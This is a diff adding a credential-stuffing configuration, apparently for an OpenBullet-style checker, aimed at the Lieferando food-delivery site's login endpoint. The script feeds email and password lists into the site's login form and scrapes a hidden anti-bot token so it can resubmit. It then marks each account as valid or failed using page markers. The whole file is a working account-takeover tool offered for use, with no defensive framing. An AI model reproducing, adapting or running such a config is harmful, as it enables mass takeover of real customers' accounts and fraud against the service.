@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "Lieferando",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-16T12:25:03.901231+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Acemy#7578",
+  "Version": "1.2.1.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.lieferando.de/xHttp/CustomerPanel.php" 
+  CONTENT "open=login&action=customerlogin&e16a199bae=01698448f878a0fe2ce814921b844ac229eef4356759cb83058c3c98d4a7953a&redirect=myaccount&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "authority: www.lieferando.de" 
+  HEADER "method: POST" 
+  HEADER "path: /xHttp/CustomerPanel.php" 
+  HEADER "scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "origin: https://www.lieferando.de" 
+  HEADER "referer: https://www.lieferando.de/" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"action\" value=\"customerlogin\" />" "\" value" -> VAR "NEVER" 
+
+FUNCTION Replace "<input type=\"hidden\" name=\"" " " "<NEVER>" -> VAR "WTF" 
+
+PARSE "<SOURCE>" LR "hidden\" name=\"<WTF>\" value=\"" "\" />" -> VAR "TOKEN" 
+
+REQUEST POST "https://www.lieferando.de/xHttp/CustomerPanel.php" 
+  CONTENT "open=login&action=customerlogin&<WTF>=<TOKEN>&redirect=myaccount&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authority: www.lieferando.de" 
+  HEADER "method: POST" 
+  HEADER "path: /xHttp/CustomerPanel.php" 
+  HEADER "scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "origin: https://www.lieferando.de" 
+  HEADER "referer: https://www.lieferando.de/" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "ADDRESS.SAVED" 
+  KEYCHAIN Failure OR 
+    KEY "Deine Anmeldung ist fehlgeschlagen" 
+
